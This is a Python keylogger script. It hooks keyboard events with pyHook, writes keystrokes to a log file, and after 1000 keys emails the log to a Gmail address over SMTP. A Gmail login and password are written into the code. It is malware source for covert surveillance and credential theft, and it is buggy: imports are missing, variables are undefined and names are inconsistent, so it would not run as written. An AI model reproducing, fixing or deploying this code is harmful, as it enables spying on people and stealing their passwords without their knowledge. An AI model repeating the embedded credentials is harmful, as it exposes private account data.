import pyhook, sys, smtplib, pythoncom, time, MIMEText
from email.mime.multipart import MIMEMultipart

file = open("logFile.txt", "a")
try:
    mail = SMTP("gmail.com", )
    mail.ehlo()
    mail.starttls()
    mail.login("coreyohulse@gmail.com", "corbosiny247")
    
except:
    pass

def OnKeyboardEvent(event):
    file.write(event.Ascii)
    numKeys += 1

    if numKeys > 1000:
        msg = MIMEMultipart()
        msg["From"] = "Key Logger"
        msg["Subject"] = time.strftime("%d/%m/%y")
        attachment = MIMEText(f.read())
        msg.attach(attachment)
        mail.sendmail("coreyohulse@gmail.com", "coreyohulse@gmail.com", msg.as_string())
        

def main():
    keyBoardLog = pyHook.Manager()
    keyBoardLog.KeyDown = OnKeyboardEvent
    keyBoard.HookKeyBoard()

    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()
